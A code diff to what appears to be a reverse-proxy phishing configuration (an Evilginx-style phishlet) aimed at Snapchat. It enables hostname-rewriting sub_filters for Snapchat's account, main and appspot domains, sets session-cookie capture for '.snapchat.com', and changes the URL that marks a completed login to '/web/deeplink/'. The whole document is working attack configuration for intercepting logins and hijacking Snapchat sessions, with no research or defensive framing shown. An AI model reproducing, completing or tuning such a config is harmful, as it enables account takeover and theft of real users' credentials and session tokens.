@@ -32,17 +32,16 @@ proxy_hosts:
   # sc-static.net
 
   
-
-# sub_filters:
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+sub_filters:
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   - domain: '.snapchat.com'
@@ -53,8 +52,7 @@ auth_tokens:
 
 
 auth_urls:
-  - '/v2/welcome'
-  - '/accounts/welcome'
+  - '/web/deeplink/'
 
 
 
